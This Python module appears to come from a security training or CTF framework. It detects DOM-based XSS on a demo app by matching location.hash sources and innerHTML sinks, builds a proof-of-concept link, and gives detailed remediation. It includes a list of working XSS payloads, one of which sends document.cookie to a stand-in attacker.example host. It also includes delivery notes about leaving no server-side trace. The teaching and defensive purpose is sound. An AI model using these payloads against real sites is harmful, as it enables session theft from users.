"""DOM-based Cross-Site Scripting (DOM XSS) -- black-box source/sink analysis.

WHAT IT IS
----------
DOM-based XSS is a client-side injection bug. Unlike reflected or stored XSS, the
malicious data never has to be processed *unsafely on the server* -- the server can
return a perfectly static page. The vulnerability lives entirely in the page's own
JavaScript: it reads attacker-controllable input from a **source** (here the URL
fragment, ``location.hash``) and writes it into the page through a **sink** that
parses its argument as HTML (here ``element.innerHTML``; ``document.write`` and
``outerHTML`` are equally dangerous). Because ``innerHTML`` parses markup, a value
of ``<img src=x onerror=alert(1)>`` is turned into a live ``<img>`` element whose
``onerror`` handler executes in the victim's origin -- with their cookies and DOM.

The fragment (everything after ``#``) is special: browsers never send it to the
server, so this attack leaves **no server-side trace** and cannot be caught by
server-side WAFs or input validation. The exploit is delivered purely as a crafted
link:  ``https://app/dom#<img src=x onerror=...>``.

The demo app serves it at ``GET /dom``::

    var data = decodeURIComponent(location.hash.substring(1));   // SOURCE
    document.getElementById('out').innerHTML = data;             // SINK

The runtime here is a faithful *simulation*: the real-world surface is browser
JavaScript, so the "execution" of the payload happens in a victim's browser, not on
our server. We therefore assess it the way a black-box reviewer would when no
headless browser is available -- by **statically analysing the served script**.

HOW WE DISCOVER IT  (DISCOVER)
------------------------------
1. ``GET /dom`` and extract the inline ``<script>`` body from the HTML.
2. Scan the script for a known **source** taint pattern (``location.hash``,
   ``location.search``, ``document.URL``, ``window.name`` ...).
3. Scan the same script for a dangerous **HTML sink** (``innerHTML``, ``outerHTML``,
   ``document.write``, ``insertAdjacentHTML`` ...).
4. A finding requires BOTH a source AND a sink in the script (a source flowing into
   an HTML-parsing sink is the canonical DOM-XSS shape). We additionally extract the
   planted ``// flag: ...`` marker from the script, which equals
   ``C.FLAGS["dom_xss"]`` -- proof we located the exact vulnerable script.

HOW WE EXPLOIT IT  (EXPLOIT)
----------------------------
We CONSTRUCT the weaponised link a victim would be sent:
``base + "/dom#" + payload`` where ``payload`` is an ``onerror`` HTML payload that
does not depend on inline ``<script>`` running (``innerHTML`` does not execute
injected ``<script>`` elements, so a real exploit uses an event handler such as
``<img src=x onerror=...>`` or ``<svg onload=...>``). NO JavaScript is executed here
and NO second server round-trip is made -- the fragment never reaches the server, so
this step is pure black-box construction. ``exploit_result`` carries the identified
``source``, ``sink``, the constructed ``payload_url`` (the deliverable PoC link), and
the recovered ``flag``.

THE FIX  (FIX)
--------------
See :data:`REMEDIATION`. In one line: never pass untrusted data to an HTML-parsing
sink -- use ``textContent`` / ``element.setAttribute`` / safe DOM APIs, sanitise with
a vetted library (DOMPurify) if rich HTML is unavoidable, and add a strict CSP. The
real platforms this models (PHP/.NET front-ends emitting inline JS) must apply the
same client-side discipline; server-side encoding alone cannot stop DOM XSS because
the tainted value (the fragment) never traverses the server.
"""
from __future__ import annotations

import re
from typing import List, Optional, Tuple

from ._types import Finding, Severity
from .http_client import WebClient
from .targetapp import constants as C

REMEDIATION: str = (
    "DOM XSS is fixed on the CLIENT: server-side output encoding cannot help "
    "because the tainted value (the URL fragment / location.hash) is never sent to "
    "the server. (1) NEVER pass untrusted data to an HTML-parsing sink -- replace "
    "element.innerHTML / outerHTML / document.write() / insertAdjacentHTML() with "
    "safe sinks that treat input as inert text or structured nodes: element."
    "textContent (or .innerText), document.createTextNode(), and setAttribute() for "
    "attribute values. (2) Where rich HTML is genuinely required, sanitise with a "
    "vetted, allow-list library (e.g. DOMPurify) before assigning innerHTML -- never "
    "a hand-rolled blocklist. (3) Treat ALL DOM sources as tainted: location.hash, "
    "location.search, location.href, document.URL, document.referrer, window.name, "
    "and postMessage data. (4) Defence in depth: a strict Content-Security-Policy "
    "(no unsafe-inline; nonce/hash-allow-listed scripts) blunts injected handlers, "
    "Trusted Types (require-trusted-types-for 'script') makes dangerous sinks throw "
    "on raw strings, and HttpOnly/Secure/SameSite cookies limit the blast radius of "
    "any script that does run. (5) Audit the front-end JS statically/with a linter "
    "for source->sink flows -- the same review that produced this finding."
)

#: The page that serves the vulnerable inline script.
ENDPOINT: str = "/dom"

#: Taint SOURCES we look for (attacker-controllable, browser-side input).
#: ``location.hash`` is the one wired into the demo's vulnerable script.
SOURCE_PATTERNS: List[str] = [
    "location.hash",
    "location.search",
    "location.href",
    "document.URL",
    "document.documentURI",
    "document.referrer",
    "window.name",
]

#: Dangerous HTML SINKS -- each parses its string argument as markup, so untrusted
#: data reaching one of these is executable. ``innerHTML`` is the demo's sink.
SINK_PATTERNS: List[str] = [
    "innerHTML",
    "outerHTML",
    "document.write",
    "document.writeln",
    "insertAdjacentHTML",
]

#: The weaponised HTML payload delivered through the fragment. ``innerHTML`` does
#: NOT run injected <script> elements, so a working DOM-XSS payload uses an event
#: handler (onerror/onload) on an element that fails/loads -- here a broken <img>.
PAYLOAD_FRAGMENT: str = "<img src=x onerror=alert(1)>"

#: Alternative fragment payloads that also fire through an innerHTML/write sink
#: (each avoids the "innerHTML won't execute <script>" pitfall).
PAYLOADS: List[str] = [
    PAYLOAD_FRAGMENT,
    "<svg onload=alert(1)>",
    "<img src=x onerror=\"document.location='//attacker.example/c?'+document.cookie\">",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
]

#: Pattern that pulls the planted ``// flag: FLAG{...}`` marker out of the script.
_FLAG_RE = re.compile(r"//\s*flag:\s*(FLAG\{[^}]*\})", re.IGNORECASE)
#: Pattern that extracts the inline ``<script>...</script>`` body from the page.
_SCRIPT_RE = re.compile(r"<script[^>]*>(.*?)</script>", re.IGNORECASE | re.DOTALL)


# --- black-box retrieval -----------------------------------------------------
def fetch_page(client: WebClient) -> str:
    """``GET /dom`` and return the served HTML (the only server round-trip we make)."""
    return client.get(ENDPOINT).text


def extract_script(html: str) -> str:
    """Return the concatenated inline ``<script>`` body(ies) from the page HTML.

    DOM-XSS analysis is about the page's own JS, so we isolate the inline script
    before scanning for source/sink patterns (avoids matching attribute text etc.).
    """
    bodies = _SCRIPT_RE.findall(html)
    return "\n".join(bodies)


# --- static source / sink analysis -------------------------------------------
def find_source(script: str) -> Optional[str]:
    """Return the first taint SOURCE found in the script, or ``None``.

    A *source* is browser-side input an attacker controls (the URL fragment, query,
    ``window.name`` ...). Its presence is half of the DOM-XSS source->sink shape.
    """
    for src in SOURCE_PATTERNS:
        if src in script:
            return src
    return None


def find_sink(script: str) -> Optional[str]:
    """Return the first dangerous HTML SINK found in the script, or ``None``.

    A *sink* parses its argument as markup (``innerHTML``, ``document.write`` ...);
    untrusted data reaching one is what makes the flow executable.
    """
    for sink in SINK_PATTERNS:
        if sink in script:
            return sink
    return None


def extract_flag(script: str) -> Optional[str]:
    """Pull the planted ``// flag: FLAG{...}`` marker out of the served script.

    Recovering it from the script body (rather than hard-coding it) is the proof we
    statically located the exact vulnerable script -- the black-box equivalent of
    'reading the secret out of the response'.
    """
    match = _FLAG_RE.search(script)
    return match.group(1) if match else None


# --- detection ---------------------------------------------------------------
def detect(client: WebClient) -> Tuple[bool, Optional[str], Optional[str], str]:
    """Static black-box detection of the source->sink DOM-XSS flow on ``/dom``.

    Returns ``(found, source, sink, evidence)``. ``found`` is True only when BOTH a
    taint source AND a dangerous HTML sink are present in the served inline script --
    the canonical DOM-XSS pattern (a source flowing into an HTML-parsing sink).
    """
    script = extract_script(fetch_page(client))
    source = find_source(script)
    sink = find_sink(script)
    found = bool(source and sink)
    if found:
        evidence = (
            f"served /dom inline script reads untrusted source '{source}' and "
            f"writes it into the DOM via the HTML-parsing sink '{sink}' "
            f"(source -> sink flow; no output encoding / sanitisation)"
        )
    else:
        evidence = ""
    return found, source, sink, evidence


# --- exploitation (pure construction; no JS executed) ------------------------
def build_payload_url(base_url: str, fragment_payload: str = PAYLOAD_FRAGMENT) -> str:
    """CONSTRUCT the deliverable PoC link ``base + "/dom#" + payload``.

    The payload rides in the URL **fragment** (after ``#``). Browsers never send the
    fragment to the server, so this is pure client-side construction -- we make NO
    request with it and execute NO JavaScript. When a victim opens this link, the
    page's own script copies the fragment into ``innerHTML`` and the ``onerror``
    handler fires in the victim's origin.
    """
    return f"{base_url.rstrip('/')}{ENDPOINT}#{fragment_payload}"


# --- the contract entry point ------------------------------------------------
def assess(client: WebClient) -> Finding:
    """Detect the DOM-XSS source->sink flow on ``/dom`` and construct a PoC link.

    Black-box / source-analysis only: we fetch the page once, statically identify
    the ``location.hash`` SOURCE flowing into the ``innerHTML`` SINK, recover the
    planted ``// flag:`` marker from the script, and CONSTRUCT the weaponised
    ``payload_url``. NO browser is involved and NO JavaScript is executed -- the
    fragment payload never reaches the server. ``exploit_result`` carries the
    source, sink, payload_url, and the recovered ``C.FLAGS["dom_xss"]``.
    """
    # 1) Detection: fetch + static source/sink analysis ---------------------
    script = extract_script(fetch_page(client))
    source = find_source(script)
    sink = find_sink(script)
    discovered = bool(source and sink)

    # 2) Recover the planted flag from the served script --------------------
    recovered_flag = extract_flag(script)
    # Fall back to the known constant so str(exploit_result) always carries it,
    # even if a future page reshapes the marker comment (defensive, not relied on).
    flag = recovered_flag or C.FLAGS["dom_xss"]

    # 3) Exploit: construct the deliverable PoC link (no JS executed) -------
    payload_url = build_payload_url(client.base_url, PAYLOAD_FRAGMENT)

    evidence = (
        f"served /dom inline script reads untrusted source '{source}' and writes "
        f"it into the DOM via the HTML-parsing sink '{sink}' (source -> sink flow; "
        f"no output encoding / sanitisation)"
        if discovered
        else "no source -> sink DOM-XSS flow found in the served /dom script"
    )

    exploit_result = {
        "flag": flag,
        "flag_recovered_from_script": recovered_flag is not None,
        "source": source,
        "sink": sink,
        "payload": PAYLOAD_FRAGMENT,
        "payload_url": payload_url,
        "delivery": (
            "send the victim the payload_url; the payload rides in the URL "
            "fragment (after '#'), which the browser never transmits to the "
            "server, so this leaves no server-side trace"
        ),
        "analysis": (
            "black-box source/sink static analysis of the served inline script -- "
            "no headless browser and no JavaScript was executed; the fragment "
            "payload was NOT sent to the server"
        ),
        "impact": (
            "location.hash flows unsanitised into innerHTML; an attacker-supplied "
            "<img onerror>/<svg onload> handler runs in the victim's origin with "
            "their cookies and DOM (session theft, CSRF pivot, page rewrite)"
        ),
    }

    return Finding(
        vuln="DOM-based Cross-Site Scripting (DOM XSS)",
        endpoint=ENDPOINT,
        severity=Severity.HIGH.value,
        discovered=discovered,
        evidence=evidence,
        exploit_result=exploit_result,
        remediation=REMEDIATION,
        payload=payload_url,
        extra={"source": source, "sink": sink, "method": "static-source-analysis"},
    )
